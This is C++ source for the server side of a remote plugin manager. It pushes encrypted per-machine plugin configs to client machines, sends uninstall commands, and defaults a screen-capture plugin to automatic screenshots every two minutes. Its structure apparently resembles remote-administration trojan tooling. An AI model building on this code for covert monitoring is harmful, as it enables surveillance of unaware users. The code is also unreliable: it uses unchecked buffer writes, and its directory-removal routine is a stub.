/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief 插件配置管理
* @author 刘成伟 chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note 
*************************************************************************/

#include "StdAfx.h"
#include <iosfwd>
#include <fstream>
#include <WinSock2.h>
#include "macros.h"
#include "include\IOCPServer.h"
#include "PluginConfig.h"
#include "PluginGlobalData.h"
#include "Log.h"


// 查询是否需要发卸载命令，如果是，发送
bool CPluginRemover::operator()(DWORD dwMachineID)
{	
	CDBPlugSetting setting;
	CDBPlugInfo info;
	int ret = 0;
	
	info.mid = dwMachineID;
	info.pid = GLOBAL_DATA->nPluginPid;
	// 取plug_info表此用户卸载标记
	ret = TspDbGet(info,GLOBAL_DATA->dbPool );
	if( ret == 0 )
	{
		//找到
		if( info.isused == CDBPlugInfo::SET )
		{
			// 卸载，发卸载命令
			ret = SendRemoveCommand();
			if( ret != 0 )
			{
				LOG((LEVEL_ERROR,"发送卸载命令失败%\n",ret));
			}

			// 清除控制端数据
			ret = ClearClientData(dwMachineID);
			if( ret != 0 )
			{
				LOG((LEVEL_ERROR,"清除卸载数据失败%\n",ret));
			}

			return true;
		}
	}
	else if( ret != DDCE_END_OF_FILE )
	{
		LOG((LEVEL_WARNNING,"数据库查询失败，mid=%d pid=%d 返回:%d(%x)\n",dwMachineID,GLOBAL_DATA->nPluginPid,ret,ret));
	}


	return false;
}

// 发送卸载命令
int CPluginRemover::SendRemoveCommand()
{
	LOG((LEVEL_FUNC_IN_OUT,"发送卸载命令(%08x,%08x)\n",m_pContext,m_pContext->m_Socket));

	BYTE	bToken = COMMAND_REMOVE;		
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));	
	return 0;
}

// 清除卸载数据库数据
int CPluginRemover::ClearClientData(unsigned long dwMachineID)
{
	LOG((LEVEL_FUNC_IN_OUT,"清除卸载数据库数据(%08x)\n",dwMachineID));

	CTspDbStorage dbStorage(GLOBAL_DATA->dbPool);
	int ret = 0;

	// 清理plug_info表数据,MID所有数据清空
	ostringstream os;
	os << CDBPlugInfo::SQLType::GetDeleteSql() << " where mid="<<dwMachineID;
	string sql = os.str();
	
	ret = dbStorage.ExecuteSql(sql);
	if( ret != 0 )
	{
		LOG((LEVEL_ERROR,"清除卸载数据失败(%08x)\n",dwMachineID));
		return DDCE_DB_OP_ERROR;
	}
	
	if( !RemoveDownloadTmpDir(dwMachineID) )
	{
		LOG((LEVEL_ERROR,"清除卸载数据失败(%08x)\n",dwMachineID));
		return DDCE_CALL_FAIL;	
	}
	return 0;

}


// 孟雷子提供
BOOL CPluginRemover::RemoveDownloadTmpDir(unsigned long _ulMid)
{
	TCHAR tchDownloadTmpDir[MAX_PATH];
	TCHAR tchConf[MAX_PATH];

	memset(&tchDownloadTmpDir,0,sizeof(tchDownloadTmpDir));
	memset(&tchConf,0,sizeof(tchConf));

	if(0 == GetModuleFileNameA(NULL,tchConf,sizeof(tchConf)))
	{
		return FALSE;
	}

	//printf("%s",tchConf);
	int iLen = strlen(tchConf);
	int i = 0;
	for(i=iLen-1;i>=0;i--)
	{
		if(TCHAR(*(tchConf+i)) == '\\')
		{
			sprintf(tchConf+i+1,"mqxc.ini");
			break;

		}

	}


	::GetPrivateProfileString("conf","downloadDir","NULL",tchDownloadTmpDir,sizeof(tchDownloadTmpDir),tchConf);

	if(0 == strcmp(tchDownloadTmpDir,"NULL"))
	{
		return FALSE;

	}

	sprintf(tchDownloadTmpDir+strlen(tchDownloadTmpDir),"\\%lu\\",_ulMid);


	printf("%s\n",tchDownloadTmpDir);

	//这里直接删除tchDownloadTmpDir表示的目录就可以了



	return TRUE;

}

///////////////////////////////////////////////////////////////////////////////////

//constrator
CPluginConfig::CPluginConfig(ClientContext *pContext,CIOCPServer *iocpServer)
	:m_pContext(pContext),m_iocpServer(iocpServer)
{
	//创建插件下载目录 "MachinePluginConfig"
	std::string m_strPluginPath;			//插件路径
	m_strPluginPath.assign( GLOBAL_DATA->szModulePath );
	m_strPluginPath += TSP_PLUGIN_C_CFG_PATH;
	if( !CreateDirectory(m_strPluginPath.c_str(),NULL) )
	{
		g_log.Log(LEVEL_WARNNING,"创建目录失败:%s 错误码:%d(%x).\n",m_strPluginPath.c_str(),GetLastError(),GetLastError());
	}	
}

//destrator
CPluginConfig::~CPluginConfig()
{

}

// 创建config文件实现
int CPluginConfig::CreateConfigFileImp(unsigned long _ulMachineID,std::list<PluginData> &l)
{
	LOG((LEVEL_FUNC_IN_OUT,"生成插件配置文件,id=%lu.\n",_ulMachineID));

	int ret;
	PluginData data;
	memset(&data,0,sizeof(data));

	// 读取总的update.ini配置文件
	string str(GLOBAL_DATA->szConfigPath);
	str += TSP_PLUGIN_M_CFG_NAME;
	
	std::list<PluginData> pluginConfigList;
	if( !ReadPluginIniFile<PluginData>(pluginConfigList,str) )	
	{
		LOG((LEVEL_WARNNING,"解析插件配置文件失败,ret:.\n"));
		return DDCE_READ_FILE_ERROR;
	}

	// 逐条取插件信息和数据库中配置，比较后写入单机插件链表	
	CDBPlugInfo info;

	l.clear();
	for( std::list<PluginData>::iterator iter=pluginConfigList.begin();iter!=pluginConfigList.end();++iter)
	{
		// plugin_info表取数据
		info.pid = iter->m_pid;
		info.mid = _ulMachineID;		
		
		ret = TspDbGet(info,GLOBAL_DATA->dbPool);		
		if( ret == 0 )
		{
			// 没有启用
			if( info.isused == CDBPlugInfo::UNSET )
				continue;
		}		
		else if( ret != DDCE_END_OF_FILE )
		{
			// 数据库未找到，用全局设置
			LOG((LEVEL_WARNNING,"数据库中取配置信息错,从设置表取:plugin_info(%d,%d) ret:%d(%x).\n",info.pid,info.mid,ret,ret));
			
			// 此项未启用
			if( GLOBAL_DATA->GetPlugSetting(iter->m_pid) == CDBPlugInfo::UNSET )			
				continue;		
		}
		else
		{
			// 新上线，使用默认设置
			if( GLOBAL_DATA->GetPlugSetting(iter->m_pid) == CDBPlugInfo::UNSET )			
				continue;
		}

		// 截屏插件参数
		if( iter->m_pid == TSP_PLUGIN_CAP_PID )
		{
			CDBCaptureSetting cap;
			cap.mid = _ulMachineID;
			ret = TspDbGet(cap,GLOBAL_DATA->dbPool );
			if( ret == 0 )
			{
				iter->m_dwReserved=cap.m_intervel<<16; //add by yx
				iter->m_dwReserved+= cap.capquality;
				strncpy(iter->m_szReserved,cap.capset,TSP_PLUGIN_SHORT_PATH);
			}
			else
			{
				// 给默认参数
				iter->m_dwReserved = 120<<16; //add by yx 默认截屏时间为2分钟
				iter->m_dwReserved += 4; //改为中
				
				//modify by yx
				//strncpy(iter->m_szReserved,"1,1,1",10);		
				strncpy(iter->m_szReserved,"0,0,0,1",10);//	默认为自动截屏			

			}
				
		}

		// 加入链表
		l.push_back(*iter);
		


	}
	
	return 0;
}

// 创建config文件
BOOL CPluginConfig::CreateConfigFile(unsigned long _ulMachineID,TCHAR _tchMachineConfigFile[TSP_PLUGIN_PATH])
{
	std::ostringstream os;

	//创建机器号为索引的目录
	os<< GLOBAL_DATA->szModulePath <<TSP_PLUGIN_C_CFG_PATH<<_ulMachineID<<"\\";
	DWORD dwAttr = GetFileAttributes(os.str().c_str() );
	if( dwAttr == -1 || (dwAttr&FILE_ATTRIBUTE_DIRECTORY) == 0 )		
		if( !CreateDirectory(os.str().c_str(),NULL ) )
		{
			g_log.Log(LEVEL_ERROR,"创建插件目录失败:%s,错误码:%d(%x).\n",os.str().c_str(),GetLastError(),GetLastError());
			return FALSE;
		}


	std::list<PluginData> l;
	std::string strFileName;
	if( 0 != CreateConfigFileImp(_ulMachineID,l) )
	{
		LOG((LEVEL_ERROR,"生成插件配置失败.\n"));
		return FALSE;
	}

	//文件名
	os<<TSP_PLUGIN_C_CFG_NAME;
	strncpy(_tchMachineConfigFile,os.str().c_str(),TSP_PLUGIN_PATH);

	// 最后一个参数是加密
	if( !WritePluginIniFile<PluginData>(l,_tchMachineConfigFile,true) )
		{	LOG((LEVEL_ERROR,"生成配置文件失败.\n"));	}

	return TRUE;
}

// 发送ini文件给server
BOOL CPluginConfig::SendFile(const char *szMachineConfigFile)
{	
	DDC_BOOL_RETURN(szMachineConfigFile==NULL,FALSE);

	CVirusFileMap fileMap(szMachineConfigFile);
	if( !fileMap )
	{
		LOG((LEVEL_ERROR,"打开配置文件失败\n"));
		return FALSE;
	}
	uint len = fileMap.FileSize()+1;
	uchar *pBuff = new uchar[len];	
	if( !pBuff )
	{
		LOG((LEVEL_ERROR,"分配内存失败\n"));
		return FALSE;
	}
	
	// 写文件内容,buff中先写一个token

	

	pBuff[0] = COMMAND_PLUGIN_REQUEST;
	memcpy(&pBuff[1],fileMap.GetBuffer(),len-1);
	
	m_iocpServer->Send(m_pContext, pBuff,len);

	DDC_DELETE(pBuff);

	return TRUE;
}

